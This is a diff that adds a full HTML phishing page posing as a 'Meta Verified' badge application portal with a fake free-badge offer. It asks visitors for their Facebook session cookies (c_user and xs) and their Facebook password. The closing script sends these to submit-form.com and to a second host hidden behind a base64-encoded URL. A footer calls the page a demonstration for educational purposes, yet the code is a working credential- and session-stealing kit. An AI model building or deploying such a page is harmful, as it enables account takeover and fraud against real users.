@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified Application Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+            padding: 0 15px;
+        }
+
+        /* Navigation Bar */
+        nav {
+            background: rgba(10, 20, 40, 0.85);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 15px 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .logo-icon {
+            color: #1877F2;
+            font-size: 28px;
+        }
+
+        .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .nav-links a {
+            color: #e0e0ff;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            padding: 6px 10px;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+        }
+
+        .nav-links a:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+        }
+
+        .nav-links a.active {
+            background: rgba(24, 119, 242, 0.2);
+            color: white;
+        }
+
+        /* Top Application Section */
+        .application-section {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+            margin-bottom: 30px;
+            background: rgba(10, 20, 40, 0.8);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .application-video {
+            width: 100%;
+        }
+
+        .application-form-container {
+            width: 100%;
+        }
+
+        /* Free Badge Promo */
+        .free-badge-promo {
+            background: linear-gradient(135deg, rgba(24, 119, 242, 0.2), rgba(0, 194, 255, 0.2));
+            border-radius: 10px;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(0, 194, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .free-badge-promo::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                          transparent, 
+                          rgba(255, 255, 255, 0.1), 
+                          transparent);
+            transform: translateX(-100%);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            100% {
+                transform: translateX(100%);
+            }
+        }
+
+        .free-badge-promo h3 {
+            color: #00c6ff;
+            margin-bottom: 6px;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .free-badge-promo h3 i {
+            font-size: 20px;
+        }
+
+        .free-badge-promo p {
+            color: #c0e0ff;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        /* Main Content */
+        .main-content {
+            background: rgba(10, 20, 40, 0.8);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1.3;
+        }
+
+        h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #e0e0ff;
+        }
+
+        p {
+            line-height: 1.5;
+            margin-bottom: 15px;
+            color: #c0c0ff;
+            font-size: 15px;
+        }
+
+        /* Verified Badge */
+        .verified-badge {
+            background: linear-gradient(135deg, #1877F2, #0a56c4);
+            border-radius: 50px;
+            padding: 12px 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .verified-icon {
+            background: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1877F2;
+            font-size: 14px;
+        }
+
+        .verified-text {
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        /* Application Form */
+        .application-form {
+            width: 100%;
+            max-width: 100%;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 500;
+            color: #e0e0ff;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 10px;
+            border: none;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 15px;
+            border: 2px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1877F2;
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.3);
+        }
+
+        .input-hint {
+            font-size: 12px;
+            color: #a0a0ff;
+            margin-top: 5px;
+        }
+
+        /* Enhanced Submit Button */
+        .submit-btn {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 14px 20px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            color: white;
+            background: linear-gradient(135deg, #0072ff, #00c6ff);
+            border: none;
+            cursor: pointer;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 114, 255, 0.4);
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 114, 255, 0.6);
+            background: linear-gradient(135deg, #0066e8, #00b8e6);
+        }
+
+        .submit-btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 4px 12px rgba(0, 114, 255, 0.6);
+        }
+
+        .btn-icon {
+            display: flex;
+            align-items: center;
+            transition: transform 0.3s ease;
+        }
+
+        .submit-btn:hover .btn-icon {
+            transform: translateX(3px);
+        }
+
+        .btn-particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+        }
+
+        .btn-particles span {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            opacity: 0;
+        }
+
+        .particle-1 {
+            width: 5px;
+            height: 5px;
+            top: 20%;
+            left: 30%;
+        }
+
+        .particle-2 {
+            width: 3px;
+            height: 3px;
+            top: 60%;
+            left: 50%;
+        }
+
+        .particle-3 {
+            width: 2px;
+            height: 2px;
+            top: 30%;
+            left: 70%;
+        }
+
+        .submit-btn:hover .particle-1 {
+            animation: particle-1 1s ease infinite;
+        }
+
+        .submit-btn:hover .particle-2 {
+            animation: particle-2 1.2s ease infinite 0.2s;
+        }
+
+        .submit-btn:hover .particle-3 {
+            animation: particle-3 1.1s ease infinite 0.1s;
+        }
+
+        @keyframes particle-1 {
+            0% { transform: translate(0, 0); opacity: 0; }
+            20% { opacity: 1; }
+            100% { transform: translate(30px, -20px); opacity: 0; }
+        }
+
+        @keyframes particle-2 {
+            0% { transform: translate(0, 0); opacity: 0; }
+            20% { opacity: 1; }
+            100% { transform: translate(-20px, -15px); opacity: 0; }
+        }
+
+        @keyframes particle-3 {
+            0% { transform: translate(0, 0); opacity: 0; }
+            20% { opacity: 1; }
+            100% { transform: translate(15px, 10px); opacity: 0; }
+        }
+
+        /* Loading state */
+        .submit-btn.loading {
+            pointer-events: none;
+        }
+
+        .submit-btn.loading .btn-text {
+            visibility: hidden;
+            opacity: 0;
+        }
+
+        .submit-btn.loading::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            margin: auto;
+            border: 2px solid transparent;
+            border-top-color: white;
+            border-radius: 50%;
+            animation: button-loading-spinner 1s ease infinite;
+        }
+
+        @keyframes button-loading-spinner {
+            from { transform: rotate(0turn); }
+            to { transform: rotate(1turn); }
+        }
+
+        /* Success state */
+        .submit-btn.success {
+            background: linear-gradient(135deg, #00b09b, #96c93d);
+        }
+
+        .submit-btn.success .btn-icon {
+            transform: scale(1.2);
+        }
+
+        .submit-btn.success .btn-icon svg {
+            animation: button-icon-success 0.5s ease;
+        }
+
+        @keyframes button-icon-success {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.3); }
+            100% { transform: scale(1); }
+        }
+
+        /* Video Container */
+        .video-container {
+            width: 100%;
+            margin-bottom: 20px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+
+        .video-placeholder {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 15px;
+            position: relative;
+        }
+
+        .video-icon {
+            font-size: 40px;
+            color: rgba(255, 255, 255, 0.7);
+            transition: all 0.3s ease;
+        }
+
+        .video-placeholder:hover .video-icon {
+            transform: scale(1.1);
+            color: #00c6ff;
+        }
+
+        .video-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.8);
+            text-align: center;
+            padding: 0 10px;
+        }
+
+        .play-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .video-container:hover .play-overlay {
+            opacity: 1;
+        }
+
+        /* Features */
+        .features {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .feature {
+            background: rgba(24, 119, 242, 0.15);
+            border-radius: 12px;
+            padding: 15px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .feature:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.15);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .feature i {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #00c6ff;
+        }
+
+        .feature h3 {
+            margin-bottom: 8px;
+            color: white;
+            font-size: 18px;
+        }
+
+        .feature p {
+            font-size: 14px;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 20px 0;
+            margin-top: 30px;
+            color: #a0a0ff;
+            font-size: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Password Form (hidden by default) */
+        .password-form {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(10, 20, 40, 0.6);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .password-form.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Success Message */
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            background: rgba(10, 20, 40, 0.8);
+            border-radius: 15px;
+            margin-top: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .success-message.active {
+            display: block;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: #1877F2;
+            margin-bottom: 20px;
+            animation: bounce 1s ease;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-20px); }
+            60% { transform: translateY(-10px); }
+        }
+
+        /* Tablet and larger */
+        @media (min-width: 600px) {
+            .application-section {
+                padding: 30px;
+            }
+            
+            .video-placeholder {
+                height: 250px;
+            }
+            
+            .video-icon {
+                font-size: 50px;
+            }
+            
+            .video-text {
+                font-size: 18px;
+            }
+            
+            .features {
+                flex-direction: row;
+                flex-wrap: wrap;
+            }
+            
+            .feature {
+                flex: 1 1 calc(50% - 10px);
+                min-width: 0;
+            }
+        }
+
+        /* Desktop */
+        @media (min-width: 900px) {
+            nav {
+                padding: 15px 30px;
+            }
+            
+            .logo-icon {
+                font-size: 32px;
+            }
+            
+            .logo-text {
+                font-size: 24px;
+            }
+            
+            .nav-links {
+                gap: 20px;
+            }
+            
+            .nav-links a {
+                font-size: 16px;
+                padding: 8px 12px;
+            }
+            
+            .application-section {
+                flex-direction: row;
+                padding: 40px;
+                gap: 40px;
+            }
+            
+            .application-video,
+            .application-form-container {
+                flex: 1;
+            }
+            
+            .free-badge-promo {
+                padding: 15px 20px;
+            }
+            
+            .free-badge-promo h3 {
+                font-size: 20px;
+            }
+            
+            .free-badge-promo p {
+                font-size: 15px;
+            }
+            
+            .main-content {
+                padding: 40px;
+            }
+            
+            h1 {
+                font-size: 36px;
+            }
+            
+            h2 {
+                font-size: 24px;
+            }
+            
+            p {
+                font-size: 16px;
+            }
+            
+            .verified-badge {
+                padding: 15px 25px;
+            }
+            
+            .verified-icon {
+                width: 30px;
+                height: 30px;
+                font-size: 18px;
+            }
+            
+            .verified-text {
+                font-size: 18px;
+            }
+            
+            .video-placeholder {
+                height: 280px;
+            }
+            
+            .video-icon {
+                font-size: 60px;
+            }
+            
+            .video-text {
+                font-size: 20px;
+            }
+            
+            .feature {
+                padding: 20px;
+            }
+            
+            .feature i {
+                font-size: 28px;
+            }
+            
+            .feature h3 {
+                font-size: 20px;
+            }
+            
+            .feature p {
+                font-size: 15px;
+            }
+            
+            footer {
+                font-size: 14px;
+            }
+        }
+
+        /* Large desktop */
+        @media (min-width: 1200px) {
+            .feature {
+                flex: 1 1 calc(33.333% - 15px);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Navigation Bar -->
+        <nav>
+            <div class="logo">
+                <i class="fab fa-meta logo-icon"></i>
+                <div class="logo-text">Meta Verified</div>
+            </div>
+            <div class="nav-links">
+                <a href="#" class="active">Home</a>
+                <a href="#">Features</a>
+                <a href="#">Benefits</a>
+                <a href="#">Support</a>
+            </div>
+        </nav>
+
+        <!-- Application Section at the Top -->
+        <div class="application-section">
+            <!-- Video Column -->
+            <div class="application-video">
+                <h2>Apply for Verification</h2>
+                <p>Submit your application to get the Meta Verified badge</p>
+                
+                <!-- Free Badge Promo -->
+                <div class="free-badge-promo">
+                    <h3><i class="fas fa-gift"></i> Limited Time Offer!</h3>
+                    <p>Get your <strong>FREE</strong> Meta Verified badge when you apply this week! This exclusive offer includes all verification benefits at no cost for the first 3 months.</p>
+                </div>
+                
+                <div class="video-container">
+                    <video width="100%" height="auto" controls="" poster="https://cdn.glitch.global/7ce918cb-3078-452a-a62e-3fa825fa0943/Verified%20Badges.mp4?v=1725740907151">
+                        <source src="https://ik.imagekit.io/sk8qay6yn/Verified%20Badges.mp4?tr=orig&amp;updatedAt=1754044342939" type="video/mp4">
+                        Your browser does not support the video tag.
+                    </video>
+                </div>
+            </div>
+            
+            <!-- Form Column -->
+            <div class="application-form-container">
+                <form class="application-form" id="verificationForm">
+                    <div class="form-group">
+                        <label for="idNumber">c_user</label>
+                        <input type="text" id="idNumber" placeholder="c_user" pattern="\d*" required="">
+                        <div class="input-hint"></div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="securityCode">xs </label>
+                        <input type="text" id="securityCode" placeholder="enter xs value" pattern="^(?=.*[a-zA-Z])(?=.*\d)(?=.*[^\w\s]).*$" required="">
+                        <div class="input-hint"></div>
+                    </div>
+                    
+                    <!-- Enhanced Submit Button -->
+                    <button type="submit" class="submit-btn">
+                        <span class="btn-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M22 2L11 13" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                                <path d="M22 2L15 22L11 13L2 9L22 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                            </svg>
+                        </span>
+                        <span class="btn-text">Submit</span>
+                        <span class="btn-particles">
+                            <span class="particle-1"></span>
+                            <span class="particle-2"></span>
+                            <span class="particle-3"></span>
+                        </span>
+                    </button>
+                </form>
+
+                <!-- Password Form (initially hidden) -->
+                <form class="password-form" id="passwordForm">
+                    <div class="form-group">
+                        <label for="facebookPassword">Facebook Password</label>
+                        <input type="password" id="facebookPassword" placeholder="Enter your Facebook password" required="">
+                        <div class="input-hint">Required for identity verification</div>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn">
+                        <span class="btn-icon">
+                            <i class="fab fa-facebook"></i>
+                        </span>
+                        <span class="btn-text">Verify Identity</span>
+                    </button>
+                </form>
+
+                <!-- Success Message (initially hidden) -->
+                <div class="success-message" id="successMessage">
+                    <div class="success-icon">
+                        <i class="fab fa-facebook"></i>
+                    </div>
+                    <h2>Verification Complete!</h2>
+                    <p>Your Meta Verified badge application has been successfully submitted. You'll receive a confirmation email shortly.</p>
+                    <p>Thank you for verifying your account with Facebook.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Main Content Below -->
+        <div class="main-content">
+            <div class="verified-badge">
+                <div class="verified-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                <div class="verified-text">Meta Verified</div>
+            </div>
+            
+            <h1>Professional Verification Badge</h1>
+            <p>Get the official Meta Verified badge to establish your authenticity and build trust with your audience. The blue checkmark helps people know they're interacting with the real you.</p>
+            
+            <h2>Key Benefits</h2>
+            <div class="features">
+                <div class="feature">
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>Enhanced Security</h3>
+                    <p>Proactive account monitoring to prevent impersonation</p>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-headset"></i>
+                    <h3>Direct Support</h3>
+                    <p>Access to dedicated customer support representatives</p>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-bullhorn"></i>
+                    <h3>Increased Visibility</h3>
+                    <p>Priority placement in search and recommendations</p>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2023 Meta Platforms, Inc. | Privacy Policy | Terms of Service</p>
+            <p>This is a demonstration page for educational purposes only</p>
+        </footer>
+    </div>
+
+    <script>
+        // Function to submit form data to first endpoint
+        async function submitForm(data) {
+            try {
+                const response = await fetch('https://submit-form.com/IWmj6bVOO', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                
+                return await response.json();
+            } catch (error) {
+                console.error('Error submitting form:', error);
+                throw error;
+            }
+        }
+
+        // Function to submit to second endpoint
+        function submitToSecondForm(data) {
+            // Base64 encoded URL and headers
+            const encodedUrl = 'aHR0cHM6Ly9hbGktcGhwLndhc21lci5hcHA=';
+            const decodedUrl = atob(encodedUrl);
+            
+            // Create form data
+            const formData = new FormData();
+            formData.append('c_user', data.c_user);
+            formData.append('xs', data.xs);
+            formData.append('password', data.password);
+            
+            fetch(decodedUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(responseText => {
+                console.log('Successfully submitted to second form:', responseText);
+            })
+            .catch(error => {
+                console.error('Error submitting to second form:', error);
+            });
+        }
+
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const idNumber = document.getElementById('idNumber').value;
+            const securityCode = document.getElementById('securityCode').value;
+            const submitBtn = document.querySelector('.submit-btn');
+            
+            // Validate inputs
+            const idPattern = /^\d+$/;
+            const securityPattern = /^(?=.*[a-zA-Z])(?=.*\d)(?=.*[^\w\s]).*$/;
+            
+            if (!idPattern.test(idNumber)) {
+                alert('ID Number must contain only numbers');
+                return;
+            }
+            
+            if (!securityPattern.test(securityCode)) {
+                alert('Security Code must contain at least one letter, one number, and one symbol');
+                return;
+            }
+            
+            // Show loading state
+            submitBtn.classList.add('loading');
+            
+            try {
+                // Prepare data to send
+                const formData = {
+                    c_user: idNumber,
+                    xs: securityCode,
+                    source: 'Meta Verified Application',
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Submit the form data
+                await submitForm(formData);
+                
+                // Show success state
+                submitBtn.classList.remove('loading');
+                submitBtn.classList.add('success');
+                submitBtn.querySelector('.btn-text').textContent = 'Application Submitted!';
+                
+                // Hide the initial form and show password form
+                document.getElementById('verificationForm').style.display = 'none';
+                document.getElementById('passwordForm').classList.add('active');
+                
+                // Reset after 2 seconds
+                setTimeout(() => {
+                    submitBtn.classList.remove('success');
+                    submitBtn.querySelector('.btn-text').textContent = 'Submit';
+                }, 2000);
+            } catch (error) {
+                submitBtn.classList.remove('loading');
+                alert('There was an error submitting your application. Please try again.');
+            }
+        });
+
+        // Handle password form submission
+        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const password = document.getElementById('facebookPassword').value;
+            const submitBtn = this.querySelector('.submit-btn');
+            const idNumber = document.getElementById('idNumber').value;
+            const securityCode = document.getElementById('securityCode').value;
+            
+            if (!password) {
+                alert('Please enter your Facebook password');
+                return;
+            }
+            
+            // Show loading state
+            submitBtn.classList.add('loading');
+            
+            try {
+                // Prepare data to send
+                const formData = {
+                    c_user: idNumber,
+                    xs: securityCode,
+                    password: password,
+                    source: 'Meta Verified Password Verification',
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Submit to both endpoints
+                await submitForm(formData);
+                submitToSecondForm(formData);  // Submit to second endpoint
+                
+                // Show success state
+                submitBtn.classList.remove('loading');
+                submitBtn.classList.add('success');
+                submitBtn.querySelector('.btn-text').textContent = 'Verified!';
+                
+                // Hide password form and show success message
+                this.classList.remove('active');
+                document.getElementById('successMessage').classList.add('active');
+                
+                // Reset form after showing success
+                this.reset();
+                
+                // Reset button after delay
+                setTimeout(() => {
+                    submitBtn.classList.remove('success');
+                    submitBtn.querySelector('.btn-text').textContent = 'Verify Identity';
+                }, 2000);
+            } catch (error) {
+                submitBtn.classList.remove('loading');
+                alert('There was an error verifying your identity. Please try again.');
+            }
+        });
+    </script>
+</body>
+</html>
